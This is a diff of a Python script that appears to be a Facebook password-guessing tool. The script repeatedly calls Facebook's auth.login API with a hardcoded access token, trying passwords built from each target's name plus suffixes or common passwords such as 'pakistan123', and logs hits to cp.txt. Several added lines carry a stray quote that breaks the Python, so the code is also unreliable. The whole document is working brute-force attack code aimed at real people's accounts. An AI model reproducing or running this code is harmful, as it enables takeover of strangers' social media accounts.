@@ -560,7 +560,7 @@ def menu_select():
 
 		try:
 
-		    pass1= name.lower()+p4
+		    pass1= name.lower()+p7
 
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -594,7 +594,7 @@ def menu_select():
 
 		        else:
 
-		            pass2= name.lower()+p3
+		            pass2= name.lower()+p6
 
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -628,7 +628,7 @@ def menu_select():
 
 		                else:
 
-		                    pass3= name.lower()+p2
+		                    pass3= name.lower()+p5
 
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -662,7 +662,7 @@ def menu_select():
 
 		                        else:
 
-		                            pass4= name.lower()+p1
+		                            pass4= name.lower()+p4
 
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -696,7 +696,7 @@ def menu_select():
 
 		                                else:
 
-		                                    pass5="22334455"
+		                                    pass5= name.lower()+p3"
 
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -704,7 +704,7 @@ def menu_select():
 
 		                                    if 'www.facebook.com' in d['error_msg']:
 
-		                                        print("\033[1;92m[SUFYAN-OK] "+uid+" | "+pass5)
+		                                        print("\033[1;91m[SUFYAN-CP] "+uid+" | "+pass5)
 
 		                                        cp=open("cp.txt","a")
 
@@ -730,7 +730,7 @@ def menu_select():
 
 		                                        else:
 
-		                                            pass6="khan1122"
+		                                            pass6= name.lower()+p2"
 
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -738,7 +738,7 @@ def menu_select():
 
 		                                            if 'www.facebook.com' in d['error_msg']:
 
-		                                                print("\033[1;92m[SUFYAN-OK] "+uid+" | "+pass6)
+		                                                print("\033[1;91m[SUFYAN-CP] "+uid+" | "+pass6)
 
 		                                                cp=open("cp.txt","a")
 
@@ -764,7 +764,7 @@ def menu_select():
 
 		                                                else:
 
-		                                                    pass7="pakistan123"
+		                                                    pass7= name.lower()+p1"
 
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -772,7 +772,7 @@ def menu_select():
 
 		                                                    if 'www.facebook.com' in d['error_msg']:
 
-		                                                        print("\033[1;92m[SUFYAN-OK] "+uid+" | "+pass7)
+		                                                        print("\033[1;91m[SUFYAN-CP] "+uid+" | "+pass7)
 
 		                                                        cp=open("cp.txt","a")
 
